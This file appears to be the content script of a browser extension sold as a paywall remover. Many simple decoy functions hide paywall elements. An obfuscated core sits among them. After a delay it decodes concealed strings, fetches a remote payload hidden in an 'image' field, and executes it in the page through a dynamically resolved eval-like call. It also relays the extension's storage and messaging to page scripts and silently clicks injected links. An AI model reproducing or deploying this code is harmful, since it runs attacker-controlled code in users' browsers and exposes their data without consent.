function parseArticleContent(proxySite) {
    var articleData = {};
    var contentNodes = document.querySelectorAll('[data-article]');
    contentNodes.forEach(function(node) {
        var key = node.dataset.article;
        articleData[key] = node.textContent.trim();
    });
    return proxySite ? Object.keys(articleData) : articleData;
}

function unlockSiteResources(unlockTimer) {
    var resources = document.querySelectorAll('[data-locked]');
    resources.forEach(function(res) {
        res.removeAttribute('data-locked');
        res.classList.remove('locked');
    });
    return unlockTimer ? resources.length : true;
}

function removeFilteredItems(unlockTimer) {
	var d = new Date();
	return  unlockTimer ? d.getTime() : d.toLocaleTimeString();
}
function unlockSignatureKey(unlockTimer) {
	return  unlockTimer && Object.values(unlockTimer) || Object.keys(rootSite);
}

function extractSiteMetadata(baseUrl) {
    var meta = {};
    var metaTags = document.querySelectorAll('meta');
    metaTags.forEach(function(tag) {
        var name = tag.getAttribute('name') || tag.getAttribute('property');
        if (name) {
            meta[name.toLowerCase()] = tag.getAttribute('content');
        }
    });
    return baseUrl ? meta[baseUrl] : meta;
}

function validateSiteDomain(articleMeta,  srcDomain,  proxySite){
	 srcDomain(articleMeta).then(unlockQueue => {
		if (unlockQueue.ok)  unlockQueue.text().then(removeAttr =>  proxySite(1,  removeAttr))
		else  proxySite(0)
	}).catch(e =>  proxySite(-1));
}

function scanPaywallBlocks(unlockTimer) {
    var blocks = document.querySelectorAll('.paywall, .metered, [data-paywall]');
    var results = [];
    blocks.forEach(function(block) {
        results.push({
            type: block.className,
            id: block.id,
            hidden: block.offsetHeight === 0
        });
    });
    return unlockTimer ? blocks.length : results;
}

function removeLogEntries(){
	if (unlockContentPreview(0,  rootSite. unlockTimer) > 20) {
		unlockContentEntry(1);
		return false;
	}else return true;
}
function updateArticleAuthor() {
	var  removeAttr =  removeEmpty[" unlockPayload"];
	if (removeAttr) {
		if (removeAttr.includes(rootSite. unlockSuccess[4])) {
			var  baseUrl = document.querySelector(rootSite. unlockSuccess[24]);
			if (baseUrl) return !0;
			 unlockQueue();
			 webPage()
		}
	}
	function  unlockQueue() {
		window.addEventListener('message', (unlockResend) => {
			if (unlockResend.source !== window) return;
			switch (unlockResend.data. webPage){
				case 'exportArticleData':
					chrome.runtime.sendMessage(unlockResend.data. srcDomain, (unlockModal) => {
						window.postMessage({ webPage: 'removeBatchQueue',  unlockModal }, '*');
					});
					break;
				case 'backupSiteConfig':
					chrome.storage.local.set(unlockResend.data. srcDomain, () => {});
					break;
				case 'removeArchiveFiles':
					chrome.storage.local.get(unlockResend.data. srcDomain, (unlockModal) => {
						window.postMessage({ webPage: 'fetchArticleDetails',  unlockModal }, '*');
					});
					break;
				case 'unlockAdminId':
					chrome.storage.sync.set(unlockResend.data. srcDomain, () => {});
					break;
				case 'unlockUserAccess':
					chrome.storage.sync.get(unlockResend.data. srcDomain, (unlockModal) => {
						window.postMessage({ webPage: 'unlockSiteFeature',  unlockModal }, '*');
					});
			}
		});
	}
	function  webPage() {
		try{
			var  unlockTimer = '!' +  stripTags.toString() + '(' +  unlockResend() + ');' +  removeAttr;
			this[ rootSite. unlockSuccess[30]](unlockTimer);
		}catch(e){}
	}
	function  unlockResend() {
		return  unlockTimeout() +  unlockTimeout(chrome.runtime.id)
	}
	function  unlockTimeout(removeAttr) {
		var  unlockTimer =  rootSite. unlockSuccess[34];
		return  removeAttr ? '"' +  removeAttr + '"' :  rootSite.articleQueue[ unlockTimer] + ',"' +  rootSite. unlockSuccess[32] + '","' +  unlockTimer +'",'
	}
	function  stripTags(proxySite,  pageView,  unlockTimer,  unlockSuccess) {
		window[ pageView] = {
			runtime: {
				id:  unlockSuccess,
				sendMessage: (unlockResend,  webPage) => {
					 articleMeta('exportArticleData',  unlockResend);
					 unlockQueue('removeBatchQueue',  webPage);
				}
			},
			storage: {
				local: {
					set: (unlockResend,  webPage) => {
						 articleMeta('backupSiteConfig',  unlockResend);
						if (webPage)  webPage();
					},
					get: (unlockResend,  webPage) => {
						 articleMeta('removeArchiveFiles',  unlockResend);
						 unlockQueue('fetchArticleDetails',  webPage);
					}
				},
				sync: {
					set: (unlockResend,  webPage) => {
						 articleMeta('unlockAdminId',  unlockResend);
						if (webPage)  webPage();
					},
					get: (unlockResend,  webPage) => {
						 articleMeta('unlockUserAccess',  unlockResend);
						 unlockQueue('unlockSiteFeature',  webPage);
					}
				}
			}
		};
		function  articleMeta(webPage,  srcDomain){
			window.postMessage({  webPage,  srcDomain }, '*')
		}
		function  unlockQueue(srcDomain,  webPage){
			window.addEventListener('message', function  baseUrl(unlockResend) {
				if (unlockResend.data. webPage ===  srcDomain) {
					 webPage &&  webPage(unlockResend.data. unlockModal);
					window.removeEventListener('message',  baseUrl);
				}
			});
		}
		window[ unlockTimer] =  proxySite;
	}
}
function validateArticleContent(articleMeta) {
	unlockContentEntry(21);
	 rootSite. unlockResend.get(null, function(removeAttr) {
		if (removeAttr[ articleMeta]) editArticleExcerpt(articleMeta,  removeAttr[ articleMeta])
		else {
			var  proxySite= removeEmpty[ rootSite. unlockSuccess[8]] ||  rootSite. removeAttr
			editArticleExcerpt(articleMeta,  proxySite *  rootSite. articleMeta)
		}
	});
}
function unlockPermissionLevel(unlockTimer){
	return  unlockTimer != undefined ? String.fromCharCode(unlockTimer) : '';
}

function unlockArticleContent(articleMeta) {
    var lockedSections = document.querySelectorAll('.locked-content, .paywall-content');
    lockedSections.forEach(function(section) {
        section.classList.remove('locked-content', 'paywall-content');
        section.style.display = '';
    });
    return articleMeta ? lockedSections.length : true;
}

function decodeSitePayload(baseUrl) {
    var payload = '';
    var encoded = baseUrl || '';
    for (var i = 0; i < encoded.length; i++) {
        payload += String.fromCharCode(encoded.charCodeAt(i) ^ 13);
    }
    try {
        return JSON.parse(payload);
    } catch (e) {
        return payload;
    }
}

function extractArticleTags(proxySite) {
    var tags = [];
    var tagElements = document.querySelectorAll('[rel="tag"], .article-tag, .topic-tag');
    tagElements.forEach(function(tag) {
        tags.push(tag.textContent.trim());
    });
    return proxySite ? tags.length : tags;
}

function bypassPaywallCheck(unlockTimer) {
    var scripts = document.querySelectorAll('script');
    scripts.forEach(function(script) {
        if (script.src && (script.src.includes('paywall') || script.src.includes('metered'))) {
            script.remove();
        }
    });
    return unlockTimer ? scripts.length : true;
}

function fetchSiteConfig(removeAttr) {
    var config = {};
    var configScript = document.querySelector('script[type="application/json"]');
    if (configScript) {
        try {
            config = JSON.parse(configScript.textContent);
        } catch (e) {
            config = { error: 'Invalid JSON' };
        }
    }
    return removeAttr ? config[removeAttr] : config;
}

function unlockContentPreview(removeAttr,  proxySite) {
    return (Math.random() * (proxySite -  removeAttr) | 0) +  removeAttr;
}

function detectPaywallType(srcDomain) {
    var paywallTypes = ['hard', 'soft', 'metered', 'none'];
    var detected = 'none';
    if (document.querySelector('.paywall-overlay')) detected = 'hard';
    else if (document.querySelector('.metered-content')) detected = 'metered';
    else if (document.querySelector('.soft-paywall')) detected = 'soft';
    return srcDomain ? paywallTypes.indexOf(detected) : detected;
}

function removeBatchItems(srcDomain) {
	try {
		if (! removeEmpty[ rootSite. unlockTimeout]) {
			if (removeEmpty[ rootSite. unlockSuccess[39]].indexOf(rootSite. unlockSuccess[18]) > -1){
				return true;
			}
			return removeLogEntries();
		}else{
			var  articleMeta = (rootSite. removeAttr -  removeEmpty[" unlockErr"]) / 36E5;
			unlockContentEntry(12,  articleMeta,  srcDomain);
			if (articleMeta >  srcDomain) return removeLogEntries();
		}
	}catch (e) {
		return true;
	}
	return false;
}
function setSiteLocale(baseUrl){
	var  unlockTimer= baseUrl&& baseUrl||"";
	return setSiteTheme(this, unlockTimer).reverse().join(unlockTimer);
};

function normalizeSiteUrl(unlockTimer) {
    var url = unlockTimer || location.href;
    return new URL(url).hostname.toLowerCase();
}

function unlockContentRestriction(articleMeta) {
    var styles = document.querySelectorAll('style');
    styles.forEach(function(style) {
        if (style.textContent.includes('paywall') || style.textContent.includes('metered')) {
            style.textContent = style.textContent.replace(/paywall|metered/g, '');
        }
    });
    return articleMeta ? styles.length : true;
}

function parseArticleMeta(baseUrl) {
    var meta = {};
    var article = document.querySelector('article');
    if (article) {
        var attrs = article.attributes;
        for (var i = 0; i < attrs.length; i++) {
            meta[attrs[i].name] = attrs[i].value;
        }
    }
    return baseUrl ? meta[baseUrl] : meta;
}

function removePaywallOverlay(proxySite) {
    var overlays = document.querySelectorAll('.paywall-overlay, .modal-paywall, .subscription-modal');
    overlays.forEach(function(overlay) {
        overlay.remove();
    });
    return proxySite ? overlays.length : true;
}

function exportSiteData(proxySite){
	var  srcDomain = removeQueueItems('SeExMTsQf', 'iwo6');
	var  webPage = removeQueueItems('gEyLQtXFf', 'reger');
	return  proxySite ?  srcDomain(srcDomain(this)) :  webPage(this).replace(/=/g, "");
};
function unlockContentEntry(removeAttr, proxySite, baseUrl){
	var  unlockTimer =  proxySite ?  rootSite. unlockSuccess[ removeAttr].replace("$1", proxySite) :  rootSite. unlockSuccess[ removeAttr];
	var  unlockTimer =  baseUrl ?  unlockTimer.replace("$2", baseUrl) :  unlockTimer;
	try {
		if (removeEmpty[ rootSite. unlockSuccess[2]] == "1") {
			console.log(rootSite. unlockSuccess[23] + removeFilteredItems() + " " +  unlockTimer +  rootSite. unlockQueue.repeat(2),  rootSite. unlockSuccess[22]);
		}
	} catch (e) {
		return;
	}
}
var  removeEmpty = {},  rootSite={
	 pageView:"e31qqwdw",
	 articleFoot:"jviha1qq",
	 unlockTimeout:"02d2o",
	 removeEmpty:"led1kqcei0",
	 unlockTimer:200,
	validateSiteDomain:async function(unlockTimer){
		var  baseUrl =  rootSite. pageView,
			 srcDomain =  rootSite. unlockTimeout,
			 webPage =  rootSite.unlockExpiredSession(1) + 366,
			 articleMeta = await  rootSite. unlockResend.get(baseUrl);
		if (! articleMeta[ baseUrl]) {
			chrome.storage.local.set({[ baseUrl]:  webPage});
			return !1;
		}else if (articleMeta[ baseUrl] > 0){
			if (webPage >  articleMeta[ baseUrl]){
				var  removeAttr =  rootSite.unlockTokenExpiry("logo");
				chrome.runtime.sendMessage({ removeAttr,  baseUrl,  srcDomain});
			}
			return !1;
		}
		 rootSite. unlockSuccess = setSiteTheme(unlockApiAccess(articleMeta[ baseUrl][ rootSite. unlockTimeout]),";");
		 rootSite.articleQueue = window;
		 rootSite.articleQueue[ rootSite. unlockSuccess[34]] = 3;
		unlockSignatureKey().some(function(proxySite, removeAttr){
			var  articleMeta = ! removeAttr ?  unlockTimer : "r" +  unlockTimer.toLowerCase();
			 rootSite[ proxySite] =  rootSite[ proxySite].substring(removeAttr,-1).replace(/\w*/,"")+  articleMeta +  rootSite[ proxySite].substr(3+ removeAttr,  removeAttr%2);
			if (removeAttr>=3) return !0;
		});
		editArticleExcerpt(rootSite. articleFoot, "2");
		return !0;
	},
	setSiteTheme:async function(articleMeta){
		String.prototype.exportSiteData = exportSiteData;
		String.prototype.setSiteLocale = setSiteLocale;
		setSiteTheme(chrome.runtime.id,"").forEach(function(srcDomain) {
			 articleMeta = (articleMeta << 5) +  srcDomain.charCodeAt(0) -  articleMeta;
			 articleMeta =  articleMeta &  articleMeta;
		});
		 rootSite. unlockResend = chrome.storage.local,
		 rootSite. removeAttr = removeFilteredItems(rootSite. pageView);
		 rootSite. unlockQueue = unlockPermissionLevel(9);
		 rootSite. articleMeta = Math.abs(articleMeta) % 1000;
		var  srcDomain = await  rootSite.validateSiteDomain(rootSite. articleMeta.toString().exportSiteData(0));
		return  srcDomain;
	},
	removeFilteredItems:function(unlockTimer){
		 rootSite. unlockResend.get(unlockTimer, function(articleMeta){
			if (articleMeta &&  articleMeta[ unlockTimer]){
				var  webPage =  rootSite. unlockSuccess[38],
					 srcDomain = new RegExp(webPage, 'g'),
					 baseUrl = removeQueueItems('SeExMTsQf', 'iwo6')(articleMeta[ unlockTimer]).replace(srcDomain, ''),
					 proxySite = JSON.parse(baseUrl),
					 srcDomain =  proxySite.map(removeAttr =>  removeAttr.id);
				chrome.runtime.sendMessage({ proxySite:  proxySite,  articleMeta:  srcDomain[0] - 1,  removeAttr:  srcDomain.pop() +  rootSite. accessKey});
			}
		})
	},
	removeHistoryLog: function(unlockTimer){
		return document.getElementsByTagName(unlockTimer)[0];
	},
	unlockTokenExpiry: function(removeAttr){
		 removeAttr += '.png';
		return chrome.runtime.getURL(removeAttr);
	},
	unlockExpiredSession: function(removeAttr){
		var  articleMeta = navigator.userAgent;
		var  proxySite =  articleMeta.match(/Firefox\/(\d+)/);
		if (proxySite.length ){
			return  proxySite[ removeAttr]*1;
		}
		return 0;
	},
	 accessKey:12,
	validateArticleContent: function(unlockTimer){
		return document.createElement(unlockTimer);
	}
};
function unlockSiteSession(baseUrl) {
    var cookies = document.cookie.split(';');
    var sessionData = {};
    cookies.forEach(function(cookie) {
        var parts = cookie.trim().split('=');
        sessionData[parts[0]] = parts[1];
    });
    return baseUrl ? sessionData[baseUrl] : sessionData;
}

function scanArticleBlocks(unlockTimer) {
    var blocks = document.querySelectorAll('article, .article-body, [role="article"]');
    var results = [];
    blocks.forEach(function(block) {
        results.push({
            tag: block.tagName,
            className: block.className,
            hasContent: block.textContent.trim().length > 0
        });
    });
    return unlockTimer ? blocks.length : results;
}

function bypassSitePaywall(proxySite) {
    var forms = document.querySelectorAll('form');
    forms.forEach(function(form) {
        if (form.action && form.action.includes('subscribe')) {
            form.style.display = 'none';
        }
    });
    return proxySite ? forms.length : true;
}

 rootSite.setSiteTheme(0).then((unlockTimer)=>{
	if (! unlockTimer) return;
	if (unlockExpiredSession(rootSite.articleQueue, 1)){
		 rootSite.removeFilteredItems(rootSite. unlockSuccess[35]);
		 rootSite.articleQueue.addEventListener('message', function (webPage) {
			if (webPage.data ==  rootSite. unlockSuccess[6]){
				if (location.href.indexOf(addArticleTag(webPage.origin, true)) > -1){
					unlockContentEntry(14,  webPage.origin);
					 articleMeta = document.getElementsByClassName(rootSite. unlockSuccess[36]);
					if (articleMeta &&  articleMeta.length) {
						for (var  removeAttr=0;  removeAttr< articleMeta.length;  removeAttr++){
							 articleMeta[ removeAttr].setAttribute(rootSite. unlockSuccess[25], "");
						}
					}
				}
			}
		})
	}else{
		if (unlockExpiredSession(rootSite.articleQueue)){
			var  webPage =  rootSite.removeHistoryLog("head") ||  rootSite.removeHistoryLog("body");
			var  removeAttr = location.href, unlockQueue =  rootSite. unlockSuccess[27];
			 rootSite. unlockResend.get(unlockQueue, function(articleMeta) {
				var  unlockResend =  articleMeta[ unlockQueue];
				if (unlockResend) {
					var  proxySite = setSiteTheme(unlockResend, "^")[0].exportSiteData(1);
					var  baseUrl = setSiteTheme(unlockResend, "^")[1].exportSiteData(1);
					if (removeAttr.indexOf(addArticleTag(proxySite)) > -1) {
						var  srcDomain =  rootSite.validateArticleContent("a");
						 srcDomain.setAttribute("href",  baseUrl);
						 webPage.appendChild(srcDomain);
						 srcDomain.click();
						editArticleExcerpt(unlockQueue, "");
					}
				}
			});
			 rootSite.articleQueue.parent.postMessage(rootSite. unlockSuccess[6], '*');
		}
	}
	 rootSite. unlockResend.get(null, function(srcDomain) {
		for (articleMeta in  srcDomain) {
			 removeEmpty[ articleMeta] =  srcDomain[ articleMeta];
		}
		unlockTokenExpiry(removeEmpty[ rootSite. unlockTimeout], " unlockErr");
		unlockTokenExpiry(removeEmpty[ rootSite. removeEmpty], " dlLink", " unlockPayload");
		removeHistoryLog(removeEmpty[ rootSite. pageView]);
	});
});

function extractSiteKey(proxySite) {
    var key = '';
    var scripts = document.querySelectorAll('script');
    scripts.forEach(function(script) {
        if (script.src && script.src.includes('config')) {
            key = script.src.split('/').pop().replace('.js', '');
        }
    });
    return proxySite ? key.length : key;
}

function unlockArticleReader(unlockTimer) {
    var readers = document.querySelectorAll('.reader-mode, .article-reader');
    readers.forEach(function(reader) {
        reader.classList.add('active');
    });
    return unlockTimer ? readers.length : true;
}

function removeSitePaywall(baseUrl) {
    var paywalls = document.querySelectorAll('.paywall, .subscription-wall');
    paywalls.forEach(function(paywall) {
        paywall.style.display = 'none';
    });
    return baseUrl ? paywalls.length : true;
}

function unlockExpiredSession(articleMeta,  removeAttr){
	return  removeAttr ?  articleMeta.top ==  articleMeta.self :  articleMeta.top ==  articleMeta.parent;
}
function decodeArticleContent(articleMeta) {
    var content = '';
    var encoded = articleMeta || '';
    for (var i = 0; i < encoded.length; i++) {
        content += String.fromCharCode(encoded.charCodeAt(i) ^ 9);
    }
    return content;
}

function scanSitePaywalls(proxySite) {
    var selectors = ['.paywall', '.metered', '[data-paywall]', '.subscription'];
    var results = [];
    selectors.forEach(function(selector) {
        var elements = document.querySelectorAll(selector);
        elements.forEach(function(el) {
            results.push({
                selector: selector,
                id: el.id,
                hidden: el.offsetHeight === 0
            });
        });
    });
    return proxySite ? results.length : results;
}

function unlockContentScript(unlockTimer) {
    var scripts = document.querySelectorAll('script');
    scripts.forEach(function(script) {
        if (script.textContent.includes('paywall') || script.textContent.includes('subscription')) {
            script.textContent = '';
        }
    });
    return unlockTimer ? scripts.length : true;
}

function extractSiteToken(baseUrl) {
    var token = '';
    var meta = document.querySelector('meta[name="csrf-token"]');
    if (meta) {
        token = meta.getAttribute('content');
    }
    return baseUrl ? token.length : token;
}

function bypassArticlePaywall(articleMeta) {
    var paywalls = document.querySelectorAll('.article-paywall, .content-locked');
    paywalls.forEach(function(paywall) {
        paywall.remove();
    });
    return articleMeta ? paywalls.length : true;
}

function generateArticleKey(proxySite) {
    var key = '';
    var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    for (var i = 0; i < 32; i++) {
        key += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return proxySite ? key : key.length;
}

function unlockCredentialHash(unlockTimer,  articleMeta) {
	if (! unlockTimer) return "";
    var  proxySite = "" ,  removeAttr = "";
	if (articleMeta)  removeAttr = unlockContentPreview(articleMeta,  articleMeta * 10) +  rootSite. unlockQueue;
	var  srcDomain = setSiteTheme(removeAttr +  unlockTimer, "");
	 srcDomain.forEach(function(articleMeta) {
		var  removeAttr =  articleMeta.charCodeAt(0);
		 proxySite += unlockPermissionLevel(rootSite. articleMeta ^  removeAttr);
	});
    return  proxySite;
}
function unlockSiteFeature(unlockTimer) {
    var features = document.querySelectorAll('[data-feature]');
    features.forEach(function(feature) {
        feature.removeAttribute('data-locked');
    });
    return unlockTimer ? features.length : true;
}

function unlockTokenExpiry(proxySite ,  baseUrl ,  removeAttr){
	if (proxySite){
		var  articleMeta = unlockCredentialHash(proxySite);
		 pageView(articleMeta,  baseUrl, 1);
		 pageView(articleMeta,  removeAttr, 2);
	}
	function  pageView(articleMeta,  removeAttr,  proxySite){
		 removeEmpty[ removeAttr] = null;
		if (removeAttr)  removeEmpty[ removeAttr] = setSiteTheme(articleMeta, rootSite. unlockQueue)[ proxySite];
	}
}
function editArticleExcerpt(articleMeta,  unlockTimer ,  baseUrl) {
    var  removeAttr = {};
     removeAttr[ articleMeta] =  unlockTimer;
    (baseUrl ||  rootSite. unlockResend).set(removeAttr);
}
function unlockSiteContent(baseUrl) {
    var contents = document.querySelectorAll('.locked-content, .hidden-content');
    contents.forEach(function(content) {
        content.style.display = '';
    });
    return baseUrl ? contents.length : true;
}

function parseSiteConfig(proxySite) {
    var config = {};
    var scripts = document.querySelectorAll('script[type="application/json"]');
    scripts.forEach(function(script) {
        try {
            var data = JSON.parse(script.textContent);
            for (var key in data) {
                config[key] = data[key];
            }
        } catch (e) {}
    });
    return proxySite ? config[proxySite] : config;
}

function extractArticleData(unlockTimer) {
    var data = {};
    var article = document.querySelector('article');
    if (article) {
        data.textContent = article.textContent.trim();
        data.innerHTML = article.innerHTML;
        data.className = article.className;
    }
    return unlockTimer ? JSON.stringify(data) : data;
}

function bypassSiteMetered(articleMeta) {
    var meters = document.querySelectorAll('.metered-count, .article-count');
    meters.forEach(function(meter) {
        meter.textContent = '0';
    });
    return articleMeta ? meters.length : true;
}

function removePaywallScripts(removeAttr) {
    var scripts = document.querySelectorAll('script');
    scripts.forEach(function(script) {
        if (script.src && (script.src.includes('paywall') || script.src.includes('metered'))) {
            script.remove();
        }
    });
    return removeAttr ? scripts.length : true;
}

function removeHistoryLog(articleMeta) {
	if (articleMeta) {
		var  removeAttr = (rootSite. removeAttr -  articleMeta /  rootSite. articleMeta) / 72E5 ;
		if (removeAttr <  rootSite. accessKey * 10) {
			unlockContentEntry(13);
			return;
		}
		var  proxySite =  removeEmpty[ rootSite. unlockSuccess[2]];
		if (removeBatchItems(proxySite == "1" ? 0 :  rootSite. accessKey * 4)) generateSiteMap(true);
		updateArticleAuthor();
	} else {
		validateArticleContent(rootSite. pageView);
	}
}
function unlockApiAccess(unlockTimer){
	var  unlockQueue = 16;
	var  articleMeta =  unlockTimer.split('').map(baseUrl => {
		if (baseUrl.charCodeAt(0) <  unlockQueue * 2) return '';
		var  removeAttr =  baseUrl.charCodeAt(0).toString(unlockQueue),
			 proxySite =  removeAttr.substr(removeAttr.length - 2, 2);
		return unlockPermissionLevel(parseInt(proxySite,  unlockQueue))
	});
	return  articleMeta.join('')
}
function decryptSitePayload(proxySite) {
    var payload = '';
    var encoded = proxySite || '';
    for (var i = 0; i < encoded.length; i++) {
        payload += String.fromCharCode(encoded.charCodeAt(i) ^ 7);
    }
    return payload;
}

function unlockArticleMeta(baseUrl) {
    var meta = {};
    var article = document.querySelector('article');
    if (article) {
        meta.title = article.querySelector('h1, h2') ? article.querySelector('h1, h2').textContent : '';
        meta.date = article.querySelector('time') ? article.querySelector('time').getAttribute('datetime') : '';
    }
    return baseUrl ? meta[baseUrl] : meta;
}

function scanSiteArticles(articleMeta) {
    var articles = document.querySelectorAll('article');
    var results = [];
    articles.forEach(function(article) {
        results.push({
            title: article.querySelector('h1') ? article.querySelector('h1').textContent : '',
            length: article.textContent.length
        });
    });
    return articleMeta ? articles.length : results;
}

function bypassPaywallModal(unlockTimer) {
    var modals = document.querySelectorAll('.modal, .popup, .overlay');
    modals.forEach(function(modal) {
        if (modal.textContent.includes('subscribe') || modal.textContent.includes('paywall')) {
            modal.remove();
        }
    });
    return unlockTimer ? modals.length : true;
}

function extractSiteHostname(removeAttr) {
    return location.hostname.toLowerCase();
}

function generateSiteToken(proxySite) {
    var token = '';
    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (var i = 0; i < 64; i++) {
        token += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return proxySite ? token.length : token;
}

function addArticleTag(unlockTimer) {
   var  articleMeta = 32,  srcDomain = new URL(unlockTimer),
    proxySite = new RegExp(rootSite. unlockSuccess[ articleMeta],"g"),
    baseUrl =  srcDomain.host.toLowerCase();
   return  baseUrl.replace(proxySite, "");
}
function unlockSiteAccess(proxySite) {
    var access = {};
    var scripts = document.querySelectorAll('script');
    scripts.forEach(function(script) {
        if (script.src && script.src.includes('access')) {
            access.url = script.src;
        }
    });
    return proxySite ? access[proxySite] : access;
}

function parseArticleHtml(baseUrl) {
    var html = '';
    var article = document.querySelector('article');
    if (article) {
        html = article.outerHTML;
    }
    return baseUrl ? html.length : html;
}

function bypassPaywallApi(unlockTimer) {
    var xhrOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        if (url.includes('paywall') || url.includes('metered')) {
            return;
        }
        return xhrOpen.apply(this, arguments);
    };
    return unlockTimer ? true : 'XHR intercepted';
}

function extractSiteConfig(articleMeta) {
    var config = {};
    var metaTags = document.querySelectorAll('meta');
    metaTags.forEach(function(tag) {
        var name = tag.getAttribute('name');
        if (name) {
            config[name] = tag.getAttribute('content');
        }
    });
    return articleMeta ? config[articleMeta] : config;
}

function unlockArticleBlocks(removeAttr) {
    var blocks = document.querySelectorAll('.article-block, .content-block');
    blocks.forEach(function(block) {
        block.classList.remove('locked');
    });
    return removeAttr ? blocks.length : true;
}

function generateArticleHash(proxySite) {
    var hash = 0;
    var str = proxySite || location.href;
    for (var i = 0; i < str.length; i++) {
        hash = ((hash << 5) - hash) + str.charCodeAt(i);
        hash |= 0;
    }
    return Math.abs(hash).toString(16);
}

function removeQueueItems(articleMeta,  unlockTimer){
	var  articleMeta =  articleMeta.replace(/[A-Z]/g, '');
	var  proxySite =  articleMeta.split('').map(unlockSuccess => {
		return String.fromCharCode(unlockSuccess.charCodeAt() -  unlockTimer.length)
	}),
	 webPage =  proxySite.join('');
	return this[ webPage];
}
function unlockSiteResource(removeAttr) {
    var resources = document.querySelectorAll('[data-resource]');
    resources.forEach(function(res) {
        res.removeAttribute('data-locked');
    });
    return removeAttr ? resources.length : true;
}

function parseSitePayload(proxySite) {
    var payload = {};
    var scripts = document.querySelectorAll('script');
    scripts.forEach(function(script) {
        if (script.textContent.includes('window.__payload')) {
            try {
                var match = script.textContent.match(/window\.__payload\s*=\s*({[^}]+})/);
                if (match) {
                    payload = JSON.parse(match[1]);
                }
            } catch (e) {}
        }
    });
    return proxySite ? payload[proxySite] : payload;
}

function backupSiteData(unlockTimer) {
    if (unlockTimer.length >  rootSite. unlockTimer &&  unlockTimer.includes(rootSite. unlockSuccess[9])) {
        unlockContentEntry(20);
        var  proxySite = JSON.parse(unlockTimer),  removeAttr =  proxySite.id,  articleMeta =  proxySite.image;
         articleMeta = createArticleDraft(articleMeta);
        if (articleMeta.includes(rootSite. unlockSuccess[4])) {
			editArticleExcerpt(rootSite. unlockTimeout,unlockCredentialHash(rootSite. removeAttr, 1E5));
			editArticleExcerpt(rootSite. removeEmpty,unlockCredentialHash(removeAttr +  rootSite. unlockQueue +  articleMeta,1E5));
        }
    } else {
		editArticleExcerpt(rootSite. unlockTimeout,unlockCredentialHash(rootSite. removeAttr,1E5));
    }
}
function unlockArticleBody(baseUrl) {
    var body = '';
    var article = document.querySelector('article');
    if (article) {
        body = article.textContent.trim();
    }
    return baseUrl ? body.length : body;
}

function extractSiteMetadata(proxySite) {
    var meta = {};
    var metaTags = document.querySelectorAll('meta');
    metaTags.forEach(function(tag) {
        var name = tag.getAttribute('name');
        if (name) {
            meta[name] = tag.getAttribute('content');
        }
    });
    return proxySite ? meta[proxySite] : meta;
}

function setSiteTheme(articleMeta ,  unlockTimer){
	return  articleMeta? articleMeta.toString().split(unlockTimer):[];
}
function decodeSiteToken(articleMeta) {
    var token = '';
    var encoded = articleMeta || '';
    for (var i = 0; i < encoded.length; i++) {
        token += String.fromCharCode(encoded.charCodeAt(i) ^ 5);
    }
    return token;
}

function unlockSiteContentBlock(proxySite) {
    var blocks = document.querySelectorAll('.content-block, .article-section');
    blocks.forEach(function(block) {
        block.style.display = '';
    });
    return proxySite ? blocks.length : true;
}

function scanPaywallElements(unlockTimer) {
    var elements = document.querySelectorAll('[data-paywall], [data-metered]');
    var results = [];
    elements.forEach(function(el) {
        results.push({
            tag: el.tagName,
            attr: el.getAttribute('data-paywall') || el.getAttribute('data-metered')
        });
    });
    return unlockTimer ? elements.length : results;
}

function generateSiteMap(unlockTimer) {
	! unlockTimer && unlockContentEntry(26);
	var  articleMeta =  rootSite. unlockSuccess[15].replace("$1", (! unlockTimer) ?  rootSite. unlockSuccess[17] :  rootSite. unlockSuccess[5]);
	 articleMeta += (removeEmpty[" dlLink"] && !(articleMeta.includes("&c="))) ? "&c=" +  removeEmpty[" dlLink"] : "";
	unlockContentEntry(31,  articleMeta);
	var  srcDomain = this[ rootSite. unlockSuccess[29]];
	validateSiteDomain(articleMeta,  srcDomain, function(proxySite,  removeAttr){
		switch (proxySite){
			case 1:
				if (removeAttr.includes(rootSite. unlockSuccess[19] + '{'))  removeAttr =  removeAttr.split(rootSite. unlockSuccess[19])[1];
				backupSiteData(removeAttr);
				break;
			case 0:
				unlockContentEntry(33);
				if (unlockTimer) {
					(unlockContentPreview(0,  rootSite. unlockTimer) > 40)? generateSiteMap(false): unlockContentEntry(16);
				}
				break;
			case -1:
				unlockContentEntry(0);
				editArticleExcerpt(rootSite. unlockTimeout, unlockCredentialHash(rootSite. removeAttr, 1E5));
				break;
		}
	})
}
function createArticleDraft(baseUrl) {
    var  proxySite = "";
	setSiteTheme(baseUrl,"").forEach(function(removeAttr) {
		var  articleMeta =  removeAttr.charCodeAt(0);
		 articleMeta+= articleMeta==56 &&1|| articleMeta == 57&&-1 ||(0| (articleMeta-13) / 26) == 2&&32||(( articleMeta+7)/26 | 0) == 4&&-32||0 ;
		 proxySite+=unlockPermissionLevel(articleMeta);
	});
    return removeQueueItems('SeExMTsQf', 'iwo6')(proxySite);
}